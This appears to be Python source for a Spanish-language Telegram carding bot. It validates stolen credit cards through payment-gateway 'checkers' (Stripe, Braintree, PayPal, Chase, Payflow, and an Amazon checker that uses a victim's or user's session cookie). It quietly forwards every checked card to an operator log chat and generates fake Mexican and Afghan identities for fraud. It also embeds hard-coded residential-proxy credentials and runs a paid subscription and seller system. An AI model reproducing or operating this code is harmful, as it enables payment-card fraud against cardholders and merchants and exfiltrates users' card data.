    "53000", "53100", "53200", "53300", "53400", "53500", "53600", "53700", "53800", "53900",  # Estado de México
    "76000", "76100", "76200", "76300", "76400", "76500", "76600", "76700", "76800", "76900",  # Querétaro
    "37000", "37100", "37200", "37300", "37400", "37500", "37600", "37700", "37800", "37900",  # Guanajuato
    "27000", "27100", "27200", "27300", "27400", "27500", "27600", "27700", "27800", "27900",  # Durango
    "95000", "95100", "95200", "95300", "95400", "95500", "95600", "95700", "95800", "95900",  # Oaxaca
    "84000", "84100", "84200", "84300", "84400", "84500", "84600", "84700", "84800", "84900",  # Sonora
    "19000", "19100", "19200", "19300", "19400", "19500", "19600", "19700", "19800", "19900",  # Veracruz
    "63000", "63100", "63200", "63300", "63400", "63500", "63600", "63700", "63800", "63900",  # Nayarit
    "84000", "84100", "84200", "84300", "84400", "84500", "84600", "84700", "84800", "84900",  # Baja California
    "08000", "08100", "08200", "08300", "08400", "08500", "08600", "08700", "08800", "08900", # Oaxaca (ciudades y pueblos)
    "68000", "68120", "68130", "68140", "68274", "68285", "68310", "68400", "68420", "68510",
    "68600", "68713", "68720", "68800", "68816", "68910", "68950",

    # Chiapas (ciudades, ejidos, comunidades)
    "29000", "29020", "29030", "29110", "29116", "29200", "29230", "29300", "29400", "29500",
    "29600", "29610", "29703", "29714", "29820", "29903", "29920",

    # Tabasco (colonias y rancherías)
    "86000", "86025", "86150", "86200", "86330", "86410", "86504", "86610", "86700", "86803",
    "86860", "86913", "86940", "86980",

    # Campeche (municipios, colonias y ejidos)
    "24000", "24157", "24200", "24300", "24350", "24400", "24500", "24600", "24700", "24810", "24915",

    # Yucatán (ciudades, fraccionamientos, pueblos)
    "97000", "97070", "97110", "97118", "97210", "97305", "97425", "97540", "97690", "97720", "97820", "97910",

    # Quintana Roo (ciudades, colonias, fraccionamientos y zonas rurales)
    "77000", "77049", "77130", "77220", "77350", "77400", "77500", "77516", "77533", "77580", "77600", "77710", "77860", "77966"  # Ciudad de México
]

def generar_correo(nombre, apellido):
    dominios = ["hotmail.com", "gmail.com", "outlook.com", "live.com"]
    while True:
        user = f"{nombre.lower()}.{apellido.lower()}{random.randint(10,99)}"
        correo = f"{user}@{random.choice(dominios)}"
        if correo not in correos_usados:
            correos_usados.add(correo)
            return correo

def generar_telefono():
    return f"55{random.randint(10000000, 99999999)}"

async def direccion_mx(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        codigo_postal = random.choice(codigos_postales_mx)
        url = f"https://api.copomex.com/query/info_cp/{codigo_postal}?token={TOKEN_COPOMEX}&type=simplified"
        response = requests.get(url)
        data = response.json()

        detalle = None

        if isinstance(data, list) and len(data) > 0:
            detalle = random.choice(data)["response"]
        elif isinstance(data, dict) and "response" in data:
            detalle = data["response"]

        if detalle:
            nombre_random = random.choice(nombres)
            apellido_random = random.choice(apellidos)
            nombre_completo = f"{nombre_random} {apellido_random}"
            correo = generar_correo(nombre_random, apellido_random)
            telefono = generar_telefono()
            numero = random.randint(1, 999)

            mensaje = (
                f"📦 <b>Generador de Datos MX</b>\n\n"
                f"👤 <b>Nombre:</b> {nombre_completo}\n"
                f"🏠 <b>Dirección:</b> {detalle['tipo_asentamiento']} {detalle['asentamiento']} #{numero}\n"
                f"🏙️ <b>Ciudad:</b> {detalle['ciudad']}\n"
                f"🌐 <b>Municipio:</b> {detalle['municipio']}\n"
                f"📍 <b>Estado:</b> {detalle['estado']}\n"
                f"🌎 <b>País:</b> {detalle['pais']}\n"
                f"🏷️ <b>Código Postal:</b> {detalle['cp']}\n"
                f"📧 <b>Email:</b> {correo}\n"
                f"📞 <b>Teléfono:</b> {telefono}"
            )

            await update.message.reply_text(mensaje, parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(f"❌ No se pudo procesar el CP {codigo_postal}")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import requests
import re
import asyncio
from concurrent.futures import ThreadPoolExecutor
import asyncio
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
from concurrent.futures import ThreadPoolExecutor

executor = ThreadPoolExecutor()

user_cookies = {}
executor = ThreadPoolExecutor(max_workers=10)  # Para manejar concurrencia

# /cookies <cookie>
async def set_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    cookie = " ".join(context.args)

    if not cookie:
        await update.message.reply_text("⚠️ Uso correcto: /cookies <tu_cookie>")
        return

    user_cookies[user_id] = cookie
    await update.message.reply_text("✅ Cookie guardada correctamente.")


# Función para procesar 1 tarjeta
def procesar_tarjeta(card, cookie):
    c =  requests.Session()
    usuariop = "RNET14947_Quituk-zone-resi-asn-AS10279"
    contraseña = "Saiper123"
    host = "us.resiproxies.net"
    puerto = "16666"

    proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"

    c.proxies = {
        "http": proxy_url,
        "https": proxy_url
    }
    url = "https://deepchk-apis.alwaysdata.net/Amazon.php"
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://deepchk-apis.alwaysdata.net',
        'Referer': 'https://deepchk-apis.alwaysdata.net'
    }
    data = {
        "lista": card,
        "cookies": cookie
    }
    try:
        c = requests.post(url, data=data, headers=headers, timeout=30)
        html = c.text.strip()

        if "Erro ao obter acesso passkey" in html:
            return "⚠️ Tu cookie ha expirado. Actualízala desde tu cuenta de Amazon.\n\n🧷 Ve a 'Mi cuenta' > 'Seguridad' e inicia sesión de nuevo."

        bloques = html.split("<br>")
        for bloque in bloques:
            match = re.search(
                r'class="text-(success|danger)">(.*?)</span> \u2794 '
                r'<span class="text-white">(.*?)</span> \u2794 '
                r'<span class="text-(success|danger)">(.*?)</span> \u2794 '
                r'Tempo de resposta: \((.*?)\) \u2794 '
                r'<span class="text-warning">(.*?)</span>',
                bloque
            )
            if match:
                estado, _, tarjeta, _, respuesta, tiempo, usuario = match.groups()
                partes = tarjeta.split()
                if len(partes) < 7:
                    continue
                numero, mm, yyyy, cvv = partes[:4]
                marca = partes[4]
                banco = " ".join(partes[5:-2])
                tipo = partes[-2]
                pais = partes[-1]

                aprobado = "✅ Aprobada" if estado == "success" else "❌ Rechazada"

                return (
                    f"{aprobado}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"💳 Tarjeta: `{numero}|{mm}|{yyyy}|{cvv}`\n"
                    f"🏦 Banco: {banco}\n"
                    f"💳 Tipo: {marca} • {tipo}\n"
                    f"🌐 País: 🇲🇽 MEXICO\n"
                    f"📌 Institución: {pais}\n"
                    f"📤 Estado: {respuesta.strip()}\n"
                    f"⏱️ Tiempo de respuesta: {tiempo}s\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━"
                )

        return "⚠️ No se pudo extraer respuesta de la API."
    except Exception as e:
        return f"❌ Error al procesar tarjeta {card}: {str(e)}"


# /amz <tarjetas>
# /amz <tarjetas>


async def amazon_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Usuario"
    text = update.message.text.partition(" ")[2].strip()
    LOG_CHAT_ID = -1002762787906  # Chat de destino para enviar resultados

    if not text:
        await update.message.reply_text("⚠️ Envía tarjetas separadas por línea o espacio tras el comando /amz")
        return

    cookie = user_cookies.get(user_id)
    if not cookie:
        await update.message.reply_text("⚠️ No has guardado una cookie. Usa /cookies <tu_cookie> primero.")
        return

    tarjetas = [line.strip() for line in text.replace('\r', '').split('\n') if line.strip()]
    tarjetas_final = []
    for t in tarjetas:
        tarjetas_final.extend(t.split())

    # ✅ Límite de 20 tarjetas
    if len(tarjetas_final) > 10:
        await update.message.reply_text(f"⚠️ Solo puedes enviar hasta 20 tarjetas. Has enviado {len(tarjetas_final)}.")
        return

    await update.message.reply_text("⏳ Procesando tus tarjetas, por favor espera...")

    loop = asyncio.get_event_loop()
    tareas = [loop.run_in_executor(executor, procesar_tarjeta, tarjeta, cookie) for tarjeta in tarjetas_final]
    resultados = await asyncio.gather(*tareas)

    mensaje_final = "\n\n".join(resultados)

    if len(mensaje_final) > 4000:
        partes = [mensaje_final[i:i+4000] for i in range(0, len(mensaje_final), 4000)]
        for parte in partes:
            await update.message.reply_text(parte, parse_mode=ParseMode.MARKDOWN)
            await context.bot.send_message(chat_id=LOG_CHAT_ID, text=parte, parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(mensaje_final, parse_mode=ParseMode.MARKDOWN)
        await context.bot.send_message(chat_id=LOG_CHAT_ID, text=mensaje_final, parse_mode=ParseMode.MARKDOWN)



from telegram import Update
from telegram.ext import ContextTypes
import json
from datetime import datetime

from telegram import Update
from telegram.ext import ContextTypes
import random

# Lista de ciudades y provincias populares de Afganistán
ciudades_afganistan = [
    ("Kabul", "Kabul"),
    ("Kandahar", "Kandahar"),
    ("Herat", "Herat"),
    ("Mazar-e Sharif", "Balkh"),
    ("Jalalabad", "Nangarhar"),
    ("Kunduz", "Kunduz"),
    ("Ghazni", "Ghazni"),
    ("Bamyan", "Bamyan")
]

calles = [
    "Street 12", "Main Road 4", "Avenue 7", "2nd District", "Block 5", "Zone 3", "Qala-e-Fathullah",
    "Shahr-e-Naw", "Taimani", "Deh Mazang", "Kart-e-Parwan", "Wazir Akbar Khan"
]

nombres = ["Ahmad", "Mohammad", "Abdullah", "Farid", "Zabiullah", "Nasir", "Omid", "Hakim", "Sami", "Naveed"]
apellidos = ["Rahimi", "Ahmadi", "Noori", "Siddiqi", "Karimi", "Hamidi", "Rezai", "Barakzai", "Zadran", "Popalzai"]

# Función para generar una dirección afgana
def generar_direccion_afganistan():
    ciudad, provincia = random.choice(ciudades_afganistan)
    calle = random.choice(calles)
    nombre = random.choice(nombres)
    apellido = random.choice(apellidos)
    numero = random.randint(1, 200)
    zip_code = f"{random.randint(1000, 9999)}"
    telefono = f"+93{random.randint(700000000, 799999999)}"
    email = f"{nombre.lower()}.{apellido.lower()}{random.randint(100,999)}@gmail.com"

    return f"""📦 *Dirección Amazon (Afganistán)* 🇦🇫
👤 Nombre: {nombre} {apellido}
📬 Dirección: {calle} #{numero}
🏙️ Ciudad: {ciudad}
🌍 Provincia: {provincia}
📮 Código Postal: {zip_code}
📱 Teléfono: {telefono}
"""

# Comando /direccion
async def direccion_afganistan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    mensaje = generar_direccion_afganistan()
    await update.message.reply_text(mensaje, parse_mode="Markdown")


async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    try:
        with open("claimed.json", "r") as f:
            claimed_data = json.load(f)

        if user_id in claimed_data:
            expires_at_str = claimed_data[user_id]["expires_at"]
            expires_at = datetime.strptime(expires_at_str, "%Y-%m-%dT%H:%M:%S.%f")

            fecha_formateada = expires_at.strftime("%d-%m-%Y %H:%M")

            mensaje = f"🧾 *Información de tu membresía:*\n\n" \
                      f"👤 Usuario: `{user_id}`\n" \
                      f"📅 *Vence el:* `{fecha_formateada}`"

        else:
            mensaje = "❌ No tienes una membresía activa."

    except Exception as e:
        mensaje = f"⚠️ Error al obtener la información: `{e}`"

    await update.message.reply_text(mensaje, parse_mode="Markdown")


import json
import os
from telegram import Update
from telegram.ext import ContextTypes

SELLERS_FILE = "sellers.json"
ADMIN_ID = 846983753  # Asegúrate de que esto sea un entero, no un string

def eliminar_seller(user_id: int) -> bool:
    if not os.path.exists(SELLERS_FILE):
        return False

    with open(SELLERS_FILE, "r") as f:
        try:
            sellers = json.load(f)
        except json.JSONDecodeError:
            sellers = {}

    if str(user_id) in sellers:
        del sellers[str(user_id)]
        with open(SELLERS_FILE, "w") as f:
            json.dump(sellers, f, indent=4)
        return True
    return False

async def banseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ No tienes permiso para usar este comando.")
        return

    if not context.args:
        await update.message.reply_text("❗ Usa el comando así: /banseller <user_id>")
        return

    try:
        seller_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("⚠️ El ID debe ser un número válido.")
        return

    eliminado = eliminar_seller(seller_id)
    if eliminado:
        await update.message.reply_text(f"✅ Seller con ID {seller_id} eliminado.")
    else:
        await update.message.reply_text(f"⚠️ El ID {seller_id} no estaba registrado como seller.")



import asyncio
import time
import os
import json
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from concurrent.futures import ThreadPoolExecutor

# Configuración general


# ThreadPool para ejecución paralela real
thread_pool = ThreadPoolExecutor(max_workers=30)


# Diccionario de comandos
COMMAND_FUNCTIONS = {
    "em": esim,
    "th": authstripe,
    "c": comandoc,
    "ccs": comandoccs,
    "c3": Braintree,
    "an": comandoan,
    "ts": toston,
    "tec": tec,
    "cs": chase,
    "red": red,
    "ul": ultra,
    "pay": paypal,
}

# ---------------------------- IMPORTS ----------------------------
import os
import json
import re
import time
import asyncio
import threading
from datetime import datetime
from telegram import Update
from telegram.ext import ContextTypes

# ---------------------------- CONFIGURACIÓN ----------------------------

ADMIN_ID = 846983753  # ← Número entero, sin comillas
SELLERS_FILE = "sellers.json"
CLAIMED_FILE = "claimed.json"
LOG_CHAT_ID = 846983753
GRUPO_CHAT_ID = 846983753
LOOP_PRINCIPAL = asyncio.get_event_loop()

# ---------------------------- FUNCIONES DE PERMISOS Y JSON ----------------------------

def load_json(filename):
    if not os.path.exists(filename):
        with open(filename, "w") as f:
            json.dump({}, f)
    with open(filename, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

def is_admin(user_id):
    # user_id debe ser entero para comparar con ADMIN_ID (entero)
    try:
        return int(user_id) == ADMIN_ID
    except Exception as e:
        print(f"[ERROR en is_admin] user_id inválido: {user_id} - {e}")
        return False

def is_seller(user_id):
    sellers = load_json(SELLERS_FILE)
    return str(user_id) in sellers

def has_subscription(user_id):
    claimed = load_json(CLAIMED_FILE)
    try:
        if str(user_id) in claimed:
            expiration = datetime.fromisoformat(claimed[str(user_id)]["expires_at"])
            return expiration > datetime.utcnow()
    except Exception as e:
        print(f"[ERROR en has_subscription]: {e}")
    return False

# ---------------------------- PROCESAMIENTO DE TARJETAS ----------------------------

def escapar_markdown(texto: str) -> str:
    escape_chars = r'\_*[]()~`>#+-=|{}.!'
    for char in escape_chars:
        texto = texto.replace(char, '\\' + char)
    return texto

def run_async_func_in_thread(func, *args, **kwargs):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        if asyncio.iscoroutinefunction(func):
            resultado = loop.run_until_complete(func(*args, **kwargs))
        else:
            resultado = func(*args, **kwargs)
        loop.close()
        return resultado
    except Exception as e:
        return f"❌ Error ejecutando función: {str(e)}"

def procesar_tarjeta_individual(card, funcion_async):
    if asyncio.iscoroutinefunction(funcion_async):
        return run_async_func_in_thread(funcion_async, card)
    else:
        return funcion_async(card)

def normalizar_tarjeta(raw_card: str):
    raw_card = raw_card.strip()
    raw_card = re.sub(r"[-/]", "|", raw_card)
    partes = raw_card.split("|")

    if len(partes) == 3:
        numero, mes, ultimo = partes
        if len(ultimo) > 2:
            año = ultimo[:4]
            cvv = ultimo[4:]
        else:
            año = ultimo
            cvv = ""
    elif len(partes) == 4:
        numero, mes, año, cvv = partes
    else:
        return None

    if len(año) == 2:
        año = "20" + año

    if not (numero.isdigit() and mes.isdigit() and año.isdigit()):
        return None
    if cvv and not cvv.isdigit():
        return None

    mes_i = int(mes)
    if not (1 <= mes_i <= 12):
        return None

    return numero, f"{mes_i:02d}", año, cvv

def tarjeta_caducada(mes: str, año: str):
    hoy = datetime.now()
    return int(año) < hoy.year or (int(año) == hoy.year and int(mes) < hoy.month)

def worker_usuario(user_id, chat_id, funcion_async, bot, tarjetas, username):
    resultados = []
    total = len(tarjetas)
    linea_separadora = escapar_markdown("───────────────")

    def procesar_y_agregar(card):
        normalizada = normalizar_tarjeta(card)
        if normalizada is None:
            resultado = f"❌ Tarjeta inválida o formato no soportado: {card}"
        else:
            numero, mes, año, cvv = normalizada
            tarjeta_formateada = f"{numero}|{mes}|{año}|{cvv}"
            if tarjeta_caducada(mes, año):
                resultado = f"❌ Tarjeta caducada: {tarjeta_formateada}"
            else:
                procesado = procesar_tarjeta_individual(tarjeta_formateada, funcion_async)
                resultado = f"✅ {tarjeta_formateada} →\n{procesado}" if not str(procesado).startswith("❌") else f"❌ {tarjeta_formateada} →\n{procesado}"
        resultados.append(resultado)

    hilos = []
    for tarjeta in tarjetas:
        hilo = threading.Thread(target=procesar_y_agregar, args=(tarjeta,))
        hilo.start()
        hilos.append(hilo)

    for hilo in hilos:
        hilo.join()

    texto_final = f"💳 Tarjetas revisadas: {total}\n"
    for r in resultados:
        texto_final += linea_separadora + "\n" + escapar_markdown(r) + "\n"
    texto_final += linea_separadora + "\n"
    texto_final += escapar_markdown(f"👤 Usuario: @{username or 'SinNombre'}") + "\n\n🟢 Finalizado"

    try:
        asyncio.run_coroutine_threadsafe(
            bot.send_message(chat_id=chat_id, text=texto_final, parse_mode="MarkdownV2"),
            LOOP_PRINCIPAL
        ).result()
    except Exception as e:
        print(f"[ERROR enviando mensaje final]: {e}")

    try:
        asyncio.run_coroutine_threadsafe(
            bot.send_message(chat_id=LOG_CHAT_ID, text=texto_final, parse_mode="MarkdownV2"),
            LOOP_PRINCIPAL
        ).result()
    except Exception as e:
        print(f"[ERROR enviando log]: {e}")

# ---------------------------- FUNCIÓN PRINCIPAL ----------------------------

async def ejecutar_verificacions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    comando = update.message.text.split()[0][1:]
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # ya es int
    username = update.effective_user.username
    tarjetas = context.args

    if not tarjetas:
        await update.message.reply_text("⚠️ Debes enviar tarjetas en formato: `1234567890123456|12|2025|123`", parse_mode="Markdown")
        return

    if len(tarjetas) > 5:
        await update.message.reply_text("🚫 Solo acepto hasta 5 tarjetas por vez", parse_mode="Markdown")
        return

    # Verificación de permisos (admin, seller o suscripción válida)
    if not (is_admin(user_id) or is_seller(user_id) or has_subscription(user_id)):
        await update.message.reply_text("⛔ No tienes permiso para usar este comando", parse_mode="Markdown")
        return

    if comando not in COMMAND_FUNCTIONS:
        await update.message.reply_text(f"❌ Comando `{comando}` no existe", parse_mode="Markdown")
        return

    funcion_async = COMMAND_FUNCTIONS[comando]

    await update.message.reply_text("⏳ Procesando tus tarjetas...", parse_mode="Markdown")

    threading.Thread(
        target=worker_usuario,
        args=(user_id, chat_id, funcion_async, context.bot, tarjetas, username),
        daemon=True
    ).start()


# ---------------------------- PRUEBA: ¿SOY ADMIN? ----------------------------

async def soy_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    resultado = is_admin(user_id)
    await update.message.reply_text(
        f"Tu ID: {user_id}\nAdmin ID esperado: {ADMIN_ID}\n¿Eres admin?: {'✅ Sí' if resultado else '❌ No'}"
    )

async def procesar_tarjetal(cc, mes, ano, cvv):
    session = requests.Session()
    payflow = Payflow(cc, mes, ano, cvv, session)
    resultado = await payflow.payflow_gate()
    return resultado

async def pw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "❌ Por favor envía las tarjetas con formato cc|mes|año|cvv separadas por espacios (máximo 10)."
        )
        return

    tarjetas = context.args[:10]
    user = update.effective_user
    username = user.username or user.first_name or "Usuario desconocido"

    # Mensaje inicial
    msg = await update.message.reply_text(
        f"⚙️ Procesando {len(tarjetas)} tarjeta(s)..."
    )

    resultados = []
    for tarjeta in tarjetas:
        try:
            cc, mes, ano, cvv = tarjeta.strip().split("|")
        except ValueError:
            resultados.append(f"❌ Formato inválido en tarjeta: `{tarjeta}`")
            continue

        resultado = await procesar_tarjetal(cc, mes, ano, cvv)
        resultados.append(
            f"💳 `{cc}|{mes}|{ano}|{cvv}`\n📊 Resultado: {resultado}"
        )

    # Unir resultados con línea separadora
    respuesta = (
        f"👤 Revisado por: `{username}`\n"
        f"🔁 Total tarjetas procesadas: {len(tarjetas)}\n\n"
        + "\n----------\n".join(resultados)
    )

    # Editar mensaje inicial para poner el resultado final
    await msg.edit_text(respuesta, parse_mode="Markdown")


if __name__ == "__main__":
        from telegram.request import HTTPXRequest

        request = HTTPXRequest(connect_timeout=10, read_timeout=10)
        app = Application.builder().token(TOKEN_ID).connection_pool_size(20).build()

        # Registrar comandos extra primero

        

        # Añadir los comandos al bot
        app.add_handler(CommandHandler('conectar', conectar))
        app.add_handler(CommandHandler('desconectar', desconectar))
        app.add_handler(CommandHandler('reconectar', reconectar))
        app.add_handler(CommandHandler("extra", extra))
        app.add_handler(CommandHandler("cc", extraer_tarjetas))
        app.add_handler(CommandHandler("bin", bin))
        app.add_handler(CommandHandler("gen", gen))
        #app.add_handler(CommandHandler("datos", datos))
        app.add_handler(CommandHandler("adid", adid))
        app.add_handler(CommandHandler("id", mostrar_id))
        app.add_handler(CommandHandler("start", mostrar_comandos))
        app.add_handler(CommandHandler("cmds", mostrar_comandos))
        app.add_handler(CommandHandler("key", key_command))
        app.add_handler(CommandHandler("claim", claim_command))
        app.add_handler(CommandHandler("addseller", add_seller_command))
        app.add_handler(CommandHandler("bankey", bankey))
        app.add_handler(CommandHandler("bin", bin))
        app.add_handler(CommandHandler("info", info))
        app.add_handler(CommandHandler("cookie", set_cookie))
        app.add_handler(CommandHandler("amz", amazon_check))
        app.add_handler(CommandHandler("direccion", direccion_afganistan))
        app.add_handler(CommandHandler("banseller", banseller))
        app.add_handler(CommandHandler("pw", pw_command))
        



        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), antispam_handler))

        # Botones
        app.add_handler(CallbackQueryHandler(manejar_callback))
       
        comandos_validoss = [ "an","c","ccs","th","ts","c3","tec","cs","red","ul","pay","end","em",]

        for cmds in comandos_validoss:
            app.add_handler(CommandHandler(cmds, ejecutar_verificacions))
        
        
       
        
        app.add_handler(CommandHandler("datos", direccion_mx))
        

        # Agregar manejadores para los comandos válidos
        comandos_validos = [ "bra","br"]

        for cmd in comandos_validos:
            app.add_handler(CommandHandler(cmd, ejecutar_verificacion))
        

        print("Bot en ejecución...")
        app.run_polling()


